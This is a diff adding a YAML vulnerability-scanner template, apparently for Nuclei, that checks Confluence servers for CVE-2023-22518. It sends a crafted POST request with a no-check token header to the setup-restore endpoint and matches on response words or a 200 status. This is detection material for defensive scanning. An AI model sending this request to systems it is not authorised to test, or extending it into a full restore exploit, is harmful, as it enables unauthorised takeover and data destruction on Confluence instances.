@@ -1,0 +1,32 @@
+id: poc-yaml-confluence-restore-privilege-bypass
+
+info:
+  name: Atlassian Confluence Data Center & Server Privilege Bypass Vulnerability
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: CVE-2023-22518
+
+variables:
+  random: "{{rand_text_alphanumeric(15)}}"
+
+http:
+  - raw:
+      - |
+        POST /json/setup-restore.action HTTP/1.1
+        Host: {{Hostname}}
+        X-Atlassian-Token: no-check
+        Content-Type: multipart/form-data; boundary=----{{random}}
+
+    matchers-condition: or
+    matchers:
+      - type: word
+        words:
+          - "buildIndexLocalFileRestore"
+        part: body
+      - type: word
+        words:
+          - "setup-restore-local.action"
+        part: body
+      - type: status
+        status:
+          - 200
